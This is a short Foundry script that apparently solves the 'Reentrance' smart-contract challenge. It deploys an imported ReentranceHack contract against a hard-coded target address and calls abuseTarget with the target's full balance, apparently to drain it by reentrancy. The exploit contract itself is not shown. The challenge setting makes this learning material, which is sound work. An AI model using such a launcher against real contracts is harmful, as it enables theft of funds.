// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/ReentranceHack.sol";
import "../src/Reentrance.sol";

contract ReentranceHackScript is Script {

  function setUp() public {}

  function run() public {
    uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
    address reentranceAddress = payable(address(0xaD0fa1Cb2f14C0B81918B2D69571f2874Ef2741D));

    uint256 levelBalance = address(reentranceAddress).balance;
    vm.startBroadcast(attackerPrivateKey);
    ReentranceHack reentranceHackContract = new ReentranceHack(reentranceAddress);

    reentranceHackContract.abuseTarget{ value: levelBalance }();
    vm.stopBroadcast();
  }
}